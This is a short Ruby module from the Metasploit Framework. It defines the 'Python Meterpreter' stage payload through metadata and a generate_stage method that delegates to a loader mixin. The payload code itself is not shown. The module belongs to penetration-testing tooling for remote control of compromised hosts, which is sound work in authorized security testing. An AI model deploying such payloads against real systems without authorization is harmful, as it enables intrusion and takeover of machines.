##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


module MetasploitModule

  include Msf::Payload::Python::MeterpreterLoader

  def initialize(info = {})
    super(update_info(info,
      'Name'          => 'Python Meterpreter',
      'Description'   => 'Run a meterpreter server in Python (compatible with 2.5-2.7 & 3.1+)',
      'Author'        => 'Spencer McIntyre',
      'Platform'      => 'python',
      'Arch'          => ARCH_PYTHON,
      'License'       => MSF_LICENSE,
      'Session'       => Msf::Sessions::Meterpreter_Python_Python
    ))
  end

  def generate_stage(opts={})
    stage_payload(opts)
  end
end
